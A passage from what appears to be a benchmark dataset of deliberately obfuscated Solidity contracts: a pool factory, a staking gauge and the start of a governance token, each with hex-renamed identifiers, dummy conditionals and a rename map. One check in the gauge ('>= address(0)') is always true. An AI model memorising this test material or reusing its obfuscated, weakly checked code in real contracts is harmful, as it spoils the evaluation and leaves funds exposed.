_0x120c9c[_0x9ac269][_0x7ec21f][_0x29e1df] = _0x4be65a;\n        emit PoolCreated(_0x7ec21f, _0x9ac269, _0x29e1df, _0x4be65a);\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0x045b3a(address _0x6673cf) external override {\n        address _0x1dfa87 = _0x5c9710;\n        require(msg.sender == _0x1dfa87);\n        require(_0x6673cf != address(0));\n        emit OwnerChanged(_0x1dfa87, _0x6673cf);\n        _0x5c9710 = _0x6673cf;\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0xf15e5e(address _0x64f6c4) external override {\n        address _0x83423b = _0x36479b;\n        require(msg.sender == _0x83423b);\n        require(_0x64f6c4 != address(0));\n        if (gasleft() > 0) { _0x36479b = _0x64f6c4; }\n        emit SwapFeeManagerChanged(_0x83423b, _0x64f6c4);\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0xe0a93a(address _0x25a0d0) external override {\n        address _0x5a4ff7 = _0x678405;\n        require(msg.sender == _0x5a4ff7);\n        require(_0x25a0d0 != address(0));\n        if (true) { _0x678405 = _0x25a0d0; }\n        emit UnstakedFeeManagerChanged(_0x5a4ff7, _0x25a0d0);\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0xa26ab6(address _0x95a88e) external override {\n        require(msg.sender == _0x36479b);\n        require(_0x95a88e != address(0));\n        address _0xbfb88e = _0x0db6dd;\n        if (1 == 1) { _0x0db6dd = _0x95a88e; }\n        emit SwapFeeModuleChanged(_0xbfb88e, _0x95a88e);\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0x32c698(address _0xbe8d4c) external override {\n        require(msg.sender == _0x678405);\n        require(_0xbe8d4c != address(0));\n        address _0xbfb88e = _0x532561;\n        _0x532561 = _0xbe8d4c;\n        emit UnstakedFeeModuleChanged(_0xbfb88e, _0xbe8d4c);\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0x4842b5(uint24 _0x857864) external override {\n        require(msg.sender == _0x678405);\n        require(_0x857864 <= 500_000);\n        uint24 _0xd3eb7c = _0xef0aa4;\n        _0xef0aa4 = _0x857864;\n        emit DefaultUnstakedFeeChanged(_0xd3eb7c, _0x857864);\n    }\n\n    function _0x7cfbc5(address _0x0455c0) external override {\n        require(msg.sender == _0xdbf254);\n        require(_0x0455c0 != address(0));\n        _0xad1ee6 = _0x0455c0;\n    }\n\n    function _0xa507c6(address _0xe030ba) external override {\n        require(msg.sender == _0xdbf254);\n        require(_0xe030ba != address(0));\n        _0xdbf254 = _0xe030ba;\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0x59a673(address _0x4be65a) external view override returns (uint24) {\n        if (_0x0db6dd != address(0)) {\n            (bool _0x608b0d, bytes memory data) = _0x0db6dd._0x6f07b7(\n                200_000, 32, abi._0xe97662(IFeeModule._0x7dd293.selector, _0x4be65a)\n            );\n            if (_0x608b0d) {\n                uint24 _0xf17265 = abi._0x405f3c(data, (uint24));\n                if (_0xf17265 <= 100_000) {\n                    return _0xf17265;\n                }\n            }\n        }\n        return _0x997346[CLPool(_0x4be65a)._0x29e1df()];\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0xcfe7f2(address _0x4be65a) external view override returns (uint24) {\n\n        if (!_0xe4ef67._0x156e19(_0x4be65a)) {\n            return 0;\n        }\n        if (_0x532561 != address(0)) {\n            (bool _0x608b0d, bytes memory data) = _0x532561._0x6f07b7(\n                200_000, 32, abi._0xe97662(IFeeModule._0x7dd293.selector, _0x4be65a)\n            );\n            if (_0x608b0d) {\n                uint24 _0xf17265 = abi._0x405f3c(data, (uint24));\n                if (_0xf17265 <= 1_000_000) {\n                    return _0xf17265;\n                }\n            }\n        }\n        return _0xef0aa4;\n    }\n\n    function _0x4257eb(address _0x4be65a) external view override returns (uint24) {\n        // if the gauge is alive, return 0, protocol fee is only for inactive gauges\n        if (_0xe4ef67._0x156e19(_0x4be65a)) {\n            return 0;\n        }\n\n        if (_0xad1ee6 != address(0)) {\n            (bool _0x608b0d, bytes memory data) = _0xad1ee6._0x6f07b7(\n                200_000, 32, abi._0xe97662(IFeeModule._0x7dd293.selector, _0x4be65a)\n            );\n            if (_0x608b0d) {\n                uint24 _0xf17265 = abi._0x405f3c(data, (uint24));\n                if (_0xf17265 <= 500_000) {\n                    return _0xf17265;\n                }\n            }\n        }\n        return _0x1d30cb;\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0x470aa9(int24 _0x29e1df, uint24 _0xf17265) public override {\n        require(msg.sender == _0x5c9710);\n        require(_0xf17265 > 0 && _0xf17265 <= 100_000);\n        // tick spacing is capped at 16384 to prevent the situation where tickSpacing is so large that\n\n        // 16384 ticks represents a >5x price change with ticks of 1 bips\n        require(_0x29e1df > 0 && _0x29e1df < 16384);\n        require(_0x997346[_0x29e1df] == 0);\n\n        _0x997346[_0x29e1df] = _0xf17265;\n        _0xf5e95c.push(_0x29e1df);\n        emit TickSpacingEnabled(_0x29e1df, _0xf17265);\n    }\n\n    function _0xbdf3dc() external  {\n        require(msg.sender == _0x5c9710);\n\n        for (uint256 i = 0; i < _0x40c397.length; i++) {\n            CLPool(_0x40c397[i])._0xc1c3db(msg.sender);\n        }\n    }\n\n    function _0xc1c3db(address _0x4be65a) external returns (uint128 _0xc28966, uint128 _0xb15551) {\n        require(msg.sender == _0x5c9710);\n        (_0xc28966, _0xb15551) = CLPool(_0x4be65a)._0xc1c3db(msg.sender);\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0xcc458d() external view override returns (int24[] memory) {\n        return _0xf5e95c;\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0xa0a7d0() external view override returns (uint256) {\n        return _0x40c397.length;\n    }\n\n    /// @inheritdoc ICLFactory\n    function _0x23b2a7(address _0x4be65a) external view override returns (bool) {\n        return _0x3b9d52[_0x4be65a];\n    }\n}",
      "rename_map": {
        "excessivelySafeStaticCall": "_0x6f07b7",
        "cachedUnstakedFeeManager": "_0x5a4ff7",
        "collectAllProtocolFees": "_0xbdf3dc",
        "setProtocolFeeManager": "_0xa507c6",
        "setDefaultUnstakedFee": "_0x4842b5",
        "setUnstakedFeeManager": "_0xe0a93a",
        "cachedSwapFeeManager": "_0x83423b",
        "setProtocolFeeModule": "_0x7cfbc5",
        "setUnstakedFeeModule": "_0x32c698",
        "isGaugeAliveForPool": "_0x156e19",
        "collectProtocolFees": "_0xc1c3db",
        "_defaultUnstakedFee": "_0x857864",
        "_unstakedFeeManager": "_0x25a0d0",
        "_poolImplementation": "_0x3367a2",
        "_protocolFeeManager": "_0xe030ba",
        "encodeWithSelector": "_0xe97662",
        "_protocolFeeModule": "_0x0455c0",
        "defaultProtocolFee": "_0x1d30cb",
        "cloneDeterministic": "_0x17e2e2",
        "defaultUnstakedFee": "_0xef0aa4",
        "unstakedFeeManager": "_0x678405",
        "poolImplementation": "_0x4f8cb5",
        "_unstakedFeeModule": "_0xbe8d4c",
        "protocolFeeManager": "_0xdbf254",
        "enableTickSpacing": "_0x470aa9",
        "setSwapFeeManager": "_0xf15e5e",
        "unstakedFeeModule": "_0x532561",
        "protocolFeeModule": "_0xad1ee6",
        "tickSpacingToFee": "_0x997346",
        "setSwapFeeModule": "_0xa26ab6",
        "_swapFeeManager": "_0x64f6c4",
        "setGaugeManager": "_0xcccaae",
        "getProtocolFee": "_0x4257eb",
        "allPoolsLength": "_0xa0a7d0",
        "_swapFeeModule": "_0x95a88e",
        "swapFeeManager": "_0x36479b",
        "getUnstakedFee": "_0xcfe7f2",
        "oldUnstakedFee": "_0xd3eb7c",
        "_tickSpacings": "_0xf5e95c",
        "_sqrtPriceX96": "_0xfff6fa",
        "swapFeeModule": "_0x0db6dd",
        "_gaugeManager": "_0xc3d23a",
        "_tickSpacing": "_0xdb0046",
        "gaugeManager": "_0xe4ef67",
        "tickSpacings": "_0xcc458d",
        "oldFeeModule": "_0xbfb88e",
        "sqrtPriceX96": "_0x12168a",
        "cachedOwner": "_0x1dfa87",
        "tickSpacing": "_0x29e1df",
        "createPool": "_0x487ee9",
        "getSwapFee": "_0x59a673",
        "initialize": "_0x2416a6",
        "keccak256": "_0x82b86d",
        "setOwner": "_0x045b3a",
        "_factory": "_0xfea64f",
        "allPools": "_0x40c397",
        "_isPool": "_0x3b9d52",
        "amount1": "_0xb15551",
        "amount0": "_0xc28966",
        "_token1": "_0x01e017",
        "getPool": "_0x120c9c",
        "_token0": "_0x3beb31",
        "success": "_0x608b0d",
        "decode": "_0x405f3c",
        "tokenB": "_0xbce1ac",
        "isPool": "_0x23b2a7",
        "encode": "_0x74df96",
        "_owner": "_0x6673cf",
        "master": "_0xe0a23a",
        "token0": "_0x7ec21f",
        "tokenA": "_0x6d815d",
        "token1": "_0x9ac269",
        "getFee": "_0x7dd293",
        "owner": "_0x5c9710",
        "pool": "_0x4be65a",
        "salt": "_0xebf572",
        "fee": "_0xf17265"
      },
      "changes": [
        "Renamed 77 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_003",
      "transformed_id": "ss_l4_medium_sn_gs_003",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\nimport './interfaces/IPair.sol';\nimport './interfaces/IBribe.sol';\nimport \"./libraries/Math.sol\";\n\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport './interfaces/IRHYBR.sol';\ninterface IRewarder {\n    function _0x7daaf3(\n        address _0x7d13a5,\n        address _0xa03d3f,\n        uint256 _0x9b4c52\n    ) external;\n}\n\ncontract GaugeV2 is ReentrancyGuard, Ownable {\n        bool _flag1 = false;\n        bool _flag2 = false;\n\n    using SafeERC20 for IERC20;\n\n    bool public immutable _0x225265;\n    bool public _0xf6fa34;\n\n    IERC20 public immutable _0xf8d867;\n    IERC20 public immutable TOKEN;\n    address public immutable _0x5d8795;\n    address public VE;\n    address public DISTRIBUTION;\n    address public _0x984059;\n    address public _0x91ec07;\n    address public _0x5e9714;\n\n    uint256 public DURATION;\n    uint256 internal _0x25074d;\n    uint256 public _0x019c87;\n    uint256 public _0xe24fe4;\n    uint256 public _0xeebef8;\n\n    mapping(address => uint256) public _0xd3d5ae;\n    mapping(address => uint256) public _0x76ee2a;\n\n    uint256 internal _0x76a574;\n    mapping(address => uint256) internal _0x8ee76f;\n    mapping(address => uint256) public _0x356459;\n\n    event RewardAdded(uint256 _0xaace37);\n    event Deposit(address indexed _0x7d13a5, uint256 _0x57c5c4);\n    event Withdraw(address indexed _0x7d13a5, uint256 _0x57c5c4);\n    event Harvest(address indexed _0x7d13a5, uint256 _0xaace37);\n\n    event ClaimFees(address indexed from, uint256 _0x200c2e, uint256 _0x5ad9f4);\n    event EmergencyActivated(address indexed _0x1b6e91, uint256 timestamp);\n    event EmergencyDeactivated(address indexed _0x1b6e91, uint256 timestamp);\n\n    modifier _0x9896b2(address _0xfdb2c5) {\n        _0xeebef8 = _0xe23bb8();\n        _0xe24fe4 = _0x9e1930();\n        if (_0xfdb2c5 != address(0)) {\n            _0x76ee2a[_0xfdb2c5] = _0xd884b5(_0xfdb2c5);\n            _0xd3d5ae[_0xfdb2c5] = _0xeebef8;\n        }\n        _;\n    }\n\n    modifier _0xbf3e8a() {\n        require(msg.sender == DISTRIBUTION, \"NA\");\n        _;\n    }\n\n    modifier _0x3efd59() {\n        require(_0xf6fa34 == false, \"EMER\");\n        _;\n    }\n\n    constructor(address _0xe47851,address _0x4c06a9,address _0x545570,address _0xaa1063,address _0x505321, address _0x1b5910, address _0x52a046, bool _0x5832f5) {\n        _0xf8d867 = IERC20(_0xe47851);     // main reward\n        _0x5d8795 = _0x4c06a9;\n        VE = _0x545570;                               // vested\n        TOKEN = IERC20(_0xaa1063);                 // underlying (LP)\n        DISTRIBUTION = _0x505321;           // distro address (GaugeManager)\n        if (1 == 1) { DURATION = HybraTimeLibrary.WEEK; }\n\n        _0x91ec07 = _0x1b5910;       // lp fees goes here\n        _0x5e9714 = _0x52a046;       // bribe fees goes here\n\n        _0x225265 = _0x5832f5;                 // pair boolean, if false no claim_fees\n\n        _0xf6fa34 = false;                      // emergency flag\n\n    }\n\n    /* -----------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n                                    ONLY OWNER\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    ----------------------------------------------------------------------------- */\n\n    ///@notice set distribution address (should be GaugeManager)\n    function _0xb330d9(address _0x505321) external _0x57f9e0 {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        require(_0x505321 != address(0), \"ZA\");\n        require(_0x505321 != DISTRIBUTION, \"SAME_ADDR\");\n        DISTRIBUTION = _0x505321;\n    }\n\n    ///@notice set gauge rewarder address\n    function _0x82aac2(address _0x7ecdd5) external _0x57f9e0 {\n        require(_0x7ecdd5 != _0x984059, \"SAME_ADDR\");\n        _0x984059 = _0x7ecdd5;\n    }\n\n    ///@notice set new internal bribe contract (where to send fees)\n    function _0xeaf39a(address _0x773836) external _0x57f9e0 {\n        require(_0x773836 >= address(0), \"ZA\");\n        _0x91ec07 = _0x773836;\n    }\n\n    function _0xff1b95() external _0x57f9e0 {\n        require(_0xf6fa34 == false, \"EMER\");\n        _0xf6fa34 = true;\n        emit EmergencyActivated(address(this), block.timestamp);\n    }\n\n    function _0xe651c1() external _0x57f9e0 {\n\n        require(_0xf6fa34 == true,\"EMER\");\n\n        _0xf6fa34 = false;\n        emit EmergencyDeactivated(address(this), block.timestamp);\n    }\n\n    /* -----------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n                                    VIEW FUNCTIONS\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    ----------------------------------------------------------------------------- */\n\n    ///@notice total supply held\n    function _0x180aa1() public view returns (uint256) {\n        return _0x76a574;\n    }\n\n    ///@notice balance of a user\n    function _0x3eed4c(address _0xfdb2c5) external view returns (uint256) {\n        return _0x4bba32(_0xfdb2c5);\n    }\n\n    function _0x4bba32(address _0xfdb2c5) internal view returns (uint256) {\n\n        return _0x8ee76f[_0xfdb2c5];\n    }\n\n    ///@notice last time reward\n    function _0x9e1930() public view returns (uint256) {\n        return Math._0x278b72(block.timestamp, _0x25074d);\n    }\n\n    ///@notice  reward for a sinle token\n    function _0xe23bb8() public view returns (uint256) {\n        if (_0x76a574 == 0) {\n            return _0xeebef8;\n        } else {\n            return _0xeebef8 + (_0x9e1930() - _0xe24fe4) * _0x019c87 * 1e18 / _0x76a574;\n        }\n    }\n\n    ///@notice see earned rewards for user\n    function _0xd884b5(address _0xfdb2c5) public view returns (uint256) {\n        return _0x76ee2a[_0xfdb2c5] + _0x4bba32(_0xfdb2c5) * (_0xe23bb8() - _0xd3d5ae[_0xfdb2c5]) / 1e18;\n    }\n\n    ///@notice get total reward for the duration\n    function _0xa0d030() external view returns (uint256) {\n        return _0x019c87 * DURATION;\n    }\n\n    function _0x0d2f36() external view returns (uint256) {\n        return _0x25074d;\n    }\n\n    /* -----------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n                                    USER INTERACTION\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    ----------------------------------------------------------------------------- */\n\n    // send whole liquidity as additional param\n\n    ///@notice deposit all TOKEN of msg.sender\n    function _0xd2de0b() external {\n        _0x4cacef(TOKEN._0x3eed4c(msg.sender), msg.sender);\n    }\n\n    ///@notice deposit amount TOKEN\n    function _0xf25d9f(uint256 _0x57c5c4) external {\n        _0x4cacef(_0x57c5c4, msg.sender);\n    }\n\n    ///@notice deposit internal\n    function _0x4cacef(uint256 _0x57c5c4, address _0xfdb2c5) internal _0xe3eb98 _0x3efd59 _0x9896b2(_0xfdb2c5) {\n        require(_0x57c5c4 > 0, \"ZV\");\n\n        _0x8ee76f[_0xfdb2c5] = _0x8ee76f[_0xfdb2c5] + _0x57c5c4;\n        _0x76a574 = _0x76a574 + _0x57c5c4;\n        if (address(_0x984059) != address(0)) {\n            IRewarder(_0x984059)._0x7daaf3(_0xfdb2c5, _0xfdb2c5, _0x4bba32(_0xfdb2c5));\n        }\n\n        TOKEN._0xc4694d(_0xfdb2c5, address(this), _0x57c5c4);\n\n        emit Deposit(_0xfdb2c5, _0x57c5c4);\n    }\n\n    ///@notice withdraw all token\n    function _0x74fd03() external {\n        _0x4a1ae1(_0x4bba32(msg.sender));\n    }\n\n    ///@notice withdraw a certain amount of TOKEN\n    function _0x9ec31f(uint256 _0x57c5c4) external {\n        _0x4a1ae1(_0x57c5c4);\n    }\n\n    ///@notice withdraw internal\n    function _0x4a1ae1(uint256 _0x57c5c4) internal _0xe3eb98 _0x3efd59 _0x9896b2(msg.sender) {\n        require(_0x57c5c4 > 0, \"ZV\");\n        require(_0x4bba32(msg.sender) > 0, \"ZV\");\n        require(block.timestamp >= _0x356459[msg.sender], \"!MATURE\");\n\n        _0x76a574 = _0x76a574 - _0x57c5c4;\n        _0x8ee76f[msg.sender] = _0x8ee76f[msg.sender] - _0x57c5c4;\n\n        if (address(_0x984059) != address(0)) {\n            IRewarder(_0x984059)._0x7daaf3(msg.sender, msg.sender,_0x4bba32(msg.sender));\n        }\n\n        TOKEN._0xd0c6ad(msg.sender, _0x57c5c4);\n\n        emit Withdraw(msg.sender, _0x57c5c4);\n    }\n\n    function _0x793df1() external _0xe3eb98 {\n        require(_0xf6fa34, \"EMER\");\n        uint256 _0x7e7ec7 = _0x4bba32(msg.sender);\n        require(_0x7e7ec7 > 0, \"ZV\");\n        _0x76a574 = _0x76a574 - _0x7e7ec7;\n\n        _0x8ee76f[msg.sender] = 0;\n\n        TOKEN._0xd0c6ad(msg.sender, _0x7e7ec7);\n        emit Withdraw(msg.sender, _0x7e7ec7);\n    }\n\n    function _0x780ad3(uint256 _0x7e7ec7) external _0xe3eb98 {\n\n        require(_0xf6fa34, \"EMER\");\n        _0x76a574 = _0x76a574 - _0x7e7ec7;\n\n        _0x8ee76f[msg.sender] = _0x8ee76f[msg.sender] - _0x7e7ec7;\n\n        TOKEN._0xd0c6ad(msg.sender, _0x7e7ec7);\n        emit Withdraw(msg.sender, _0x7e7ec7);\n    }\n\n    ///@notice withdraw all TOKEN and harvest rewardToken\n    function _0x6e10c4(uint8 _0xbfeb2f) external {\n        _0x4a1ae1(_0x4bba32(msg.sender));\n        _0xb81c6c(_0xbfeb2f);\n    }\n\n    ///@notice User harvest function called from distribution (GaugeManager allows harvest on multiple gauges)\n    function _0xb81c6c(address _0x69e5f9, uint8 _0xbfeb2f) public _0xe3eb98 _0xbf3e8a _0x9896b2(_0x69e5f9) {\n        uint256 _0xaace37 = _0x76ee2a[_0x69e5f9];\n        if (_0xaace37 > 0) {\n            _0x76ee2a[_0x69e5f9] = 0;\n            IERC20(_0xf8d867)._0x5e3983(_0x5d8795, _0xaace37);\n            IRHYBR(_0x5d8795)._0x2ab5e7(_0xaace37);\n            IRHYBR(_0x5d8795)._0x3517dd(_0xaace37, _0xbfeb2f, _0x69e5f9);\n            emit Harvest(_0x69e5f9, _0xaace37);\n        }\n\n        if (_0x984059 != address(0)) {\n            IRewarder(_0x984059)._0x7daaf3(_0x69e5f9, _0x69e5f9, _0x4bba32(_0x69e5f9));\n        }\n    }\n\n    ///@notice User harvest function\n    function _0xb81c6c(uint8 _0xbfeb2f) public _0xe3eb98 _0x9896b2(msg.sender) {\n        uint256 _0xaace37 = _0x76ee2a[msg.sender];\n        if (_0xaace37 > 0) {\n            _0x76ee2a[msg.sender] = 0;\n            IERC20(_0xf8d867)._0x5e3983(_0x5d8795, _0xaace37);\n            IRHYBR(_0x5d8795)._0x2ab5e7(_0xaace37);\n            IRHYBR(_0x5d8795)._0x3517dd(_0xaace37, _0xbfeb2f, msg.sender);\n            emit Harvest(msg.sender, _0xaace37);\n        }\n\n        if (_0x984059 != address(0)) {\n            IRewarder(_0x984059)._0x7daaf3(msg.sender, msg.sender, _0x4bba32(msg.sender));\n        }\n    }\n\n    /* -----------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n                                    DISTRIBUTION\n    --------------------------------------------------------------------------------\n    --------------------------------------------------------------------------------\n    ----------------------------------------------------------------------------- */\n\n    /// @dev Receive rewards from distribution\n\n    function _0x7b8368(address _0xbce57c, uint256 _0xaace37) external _0xe3eb98 _0x3efd59 _0xbf3e8a _0x9896b2(address(0)) {\n        require(_0xbce57c == address(_0xf8d867), \"IA\");\n        _0xf8d867._0xc4694d(DISTRIBUTION, address(this), _0xaace37);\n\n        if (block.timestamp >= _0x25074d) {\n            _0x019c87 = _0xaace37 / DURATION;\n        } else {\n            uint256 _0x211524 = _0x25074d - block.timestamp;\n            uint256 _0x703260 = _0x211524 * _0x019c87;\n            if (msg.sender != address(0) || msg.sender == address(0)) { _0x019c87 = (_0xaace37 + _0x703260) / DURATION; }\n        }\n\n        // Ensure the provided reward amount is not more than the balance in the contract.\n\n        // very high values of rewardRate in the earned and rewardsPerToken functions;\n\n        uint256 balance = _0xf8d867._0x3eed4c(address(this));\n        require(_0x019c87 <= balance / DURATION, \"REWARD_HIGH\");\n\n        _0xe24fe4 = block.timestamp;\n        _0x25074d = block.timestamp + DURATION;\n        emit RewardAdded(_0xaace37);\n    }\n\n    function _0xe2e239() external _0xe3eb98 returns (uint256 _0x200c2e, uint256 _0x5ad9f4) {\n        return _0x1a27f5();\n    }\n\n     function _0x1a27f5() internal returns (uint256 _0x200c2e, uint256 _0x5ad9f4) {\n        if (!_0x225265) {\n            return (0, 0);\n        }\n        address _0xaa1063 = address(TOKEN);\n        (_0x200c2e, _0x5ad9f4) = IPair(_0xaa1063)._0xe2e239();\n        if (_0x200c2e > 0 || _0x5ad9f4 > 0) {\n\n            uint256 _0xbabe60 = _0x200c2e;\n            uint256 _0xa31928 = _0x5ad9f4;\n\n            (address _0x6752fd, address _0x3fbc95) = IPair(_0xaa1063)._0x45c0c1();\n\n            if (_0xbabe60  > 0) {\n                IERC20(_0x6752fd)._0x5e3983(_0x91ec07, 0);\n                IERC20(_0x6752fd)._0x5e3983(_0x91ec07, _0xbabe60);\n                IBribe(_0x91ec07)._0x7b8368(_0x6752fd, _0xbabe60);\n            }\n            if (_0xa31928  > 0) {\n                IERC20(_0x3fbc95)._0x5e3983(_0x91ec07, 0);\n                IERC20(_0x3fbc95)._0x5e3983(_0x91ec07, _0xa31928);\n                IBribe(_0x91ec07)._0x7b8368(_0x3fbc95, _0xa31928);\n            }\n            emit ClaimFees(msg.sender, _0x200c2e, _0x5ad9f4);\n        }\n    }\n\n}",
      "rename_map": {
        "lastTimeRewardApplicable": "_0x9e1930",
        "depostionEmissionsToken": "_0x2ab5e7",
        "emergencyWithdrawAmount": "_0x780ad3",
        "userRewardPerTokenPaid": "_0xd3d5ae",
        "activateEmergencyMode": "_0xff1b95",
        "withdrawAllAndHarvest": "_0x6e10c4",
        "rewardPerTokenStored": "_0xeebef8",
        "notifyRewardAmount": "_0x7b8368",
        "stopEmergencyMode": "_0xe651c1",
        "rewardForDuration": "_0xa0d030",
        "emergencyWithdraw": "_0x793df1",
        "onlyDistribution": "_0xbf3e8a",
        "safeTransferFrom": "_0xc4694d",
        "setInternalBribe": "_0xeaf39a",
        "setGaugeRewarder": "_0x82aac2",
        "_external_bribe": "_0x52a046",
        "_internal_bribe": "_0x1b5910",
        "setDistribution": "_0xb330d9",
        "rewardPerToken": "_0xe23bb8",
        "_gaugeRewarder": "_0x7ecdd5",
        "isNotEmergency": "_0x3efd59",
        "lastUpdateTime": "_0xe24fe4",
        "internal_bribe": "_0x91ec07",
        "external_bribe": "_0x5e9714",
        "_periodFinish": "_0x25074d",
        "gaugeRewarder": "_0x984059",
        "_distribution": "_0x505321",
        "periodFinish": "_0x0d2f36",
        "nonReentrant": "_0xe3eb98",
        "updateReward": "_0x9896b2",
        "safeTransfer": "_0xd0c6ad",
        "_rewardToken": "_0xe47851",
        "_totalSupply": "_0x76a574",
        "maturityTime": "_0x356459",
        "userBalance": "_0x9b4c52",
        "_redeemType": "_0xbfeb2f",
        "safeApprove": "_0x5e3983",
        "rewardToken": "_0xf8d867",
        "totalSupply": "_0x180aa1",
        "withdrawAll": "_0x74fd03",
        "_isForPair": "_0x5832f5",
        "_balanceOf": "_0x4bba32",
        "_claimFees": "_0x1a27f5",
        "rewardRate": "_0x019c87",
        "depositAll": "_0xd2de0b",
        "onlyOwner": "_0x57f9e0",
        "_withdraw": "_0x4a1ae1",
        "balanceOf": "_0x3eed4c",
        "getReward": "_0xb81c6c",
        "emergency": "_0xf6fa34",
        "redeemFor": "_0x3517dd",
        "isForPair": "_0x225265",
        "_balances": "_0x8ee76f",
        "recipient": "_0xa03d3f",
        "remaining": "_0x211524",
        "claimFees": "_0xe2e239",
        "_deposit": "_0x4cacef",
        "onReward": "_0x7daaf3",
        "claimed0": "_0x200c2e",
        "leftover": "_0x703260",
        "withdraw": "_0x9ec31f",
        "claimed1": "_0x5ad9f4",
        "rewards": "_0x76ee2a",
        "_token1": "_0x3fbc95",
        "_amount": "_0x7e7ec7",
        "deposit": "_0xf25d9f",
        "_token0": "_0x6752fd",
        "account": "_0xfdb2c5",
        "_fees1": "_0xa31928",
        "tokens": "_0x45c0c1",
        "reward": "_0xaace37",
        "_rHYBR": "_0x4c06a9",
        "_fees0": "_0xbabe60",
        "earned": "_0xd884b5",
        "_token": "_0xaa1063",
        "amount": "_0x57c5c4",
        "rHYBR": "_0x5d8795",
        "token": "_0xbce57c",
        "gauge": "_0x1b6e91",
        "_user": "_0x69e5f9",
        "_int": "_0x773836",
        "user": "_0x7d13a5",
        "min": "_0x278b72",
        "_ve": "_0x545570"
      },
      "changes": [
        "Renamed 84 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_004",
      "transformed_id": "ss_l4_medium_sn_gs_004",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./interfaces/IVotingEscrow.sol\";\nimport \"./interfaces/IVoter.sol\";\nimport \"./interfaces/IBribe.sol\";\nimport \"./interfaces/IRewardsDistributor.sol\";\nimport \"./interfaces/IGaugeManager.sol\";\nimport \"./interfaces/ISwapper.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/**\n * @title GovernanceHYBR (gHYBR)\n * @notice Auto-compounding staking token that locks HYBR as veHYBR and compounds rewards\n * @dev Implements transfer restrictions for new deposits and automatic reward compounding\n */\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\n    using SafeERC20 for IERC20;\n    // Lock period for new deposits (configurable between 12-24 hours)\n    uint256 public _0xace4db = 24 hours;\n    uint256 public constant MIN_LOCK_PERIOD = 1 minutes;\n    uint256 public constant MAX_LOCK_PERIOD = 240 minutes;\n    uint256 public _0x8f1f3a = 1200; // 5days\n    uint256 public _0xdc21be = 300; // 1day\n\n    // Withdraw fee configuration (basis points, 10000 = 100%)\n    uint256 public _0x016abc = 100; // 1% default fee\n    uint256 public constant MIN_WITHDRAW_FEE = 10; // 0.1% minimum\n    uint256 public constant MAX_WITHDRAW_FEE = 1000; // 10% maximum\n    uint256 public constant BASIS = 10000;\n    address public Team; // Address to receive fees\n    uint256 public _0x019b41;\n    uint256 public _0x267a24;\n    uint256 public _0x5c4df8;\n    // User deposit tracking for transfer locks\n    struct UserLock {\n        uint256 _0x95fff8;\n        uint256 _0xa139bd;\n    }\n\n    mapping(address => UserLock[]) public _0xb1426b;\n    mapping(address => uint256) public _0x28932d;\n\n    // Core contracts\n    address public immutable HYBR;\n    address public immutable _0xe6284b;\n    address public _0x6e7fb6;\n    address public _0xd40973;\n    address public _0x7e0b9f;\n    uint256 public _0xa035e7; // The veNFT owned by this contract\n\n    // Auto-voting strategy\n    address public _0x1b092a; // Address that can manage voting strategy\n    uint256 public _0xe4f9f1; // Last epoch when we voted\n\n    // Reward tracking\n    uint256 public _0x964872;\n    uint256 public _0x609601;\n\n    // Swap module\n    ISwapper public _0x767891;\n\n    // Errors\n    error NOT_AUTHORIZED();\n\n    // Events\n    event Deposit(address indexed _0x75cc28, uint256 _0x4ff365, uint256 _0x499ee8);\n    event Withdraw(address indexed _0x75cc28, uint256 _0x4afad4, uint256 _0x4ff365, uint256 _0x01e553);\n    event Compound(uint256 _0x836c7c, uint256 _0x31e40d);\n    event PenaltyRewardReceived(uint256 _0x95fff8);\n    event TransferLockPeriodUpdated(uint256 _0x28ad5a, uint256 _0x4828e6);\n    event SwapperUpdated(address indexed _0x086ada, address indexed _0x38d3c0);\n    event VoterSet(address _0x6e7fb6);\n    event EmergencyUnlock(address indexed _0x75cc28);\n    event AutoVotingEnabled(bool _0x050a7c);\n    event OperatorUpdated(address indexed 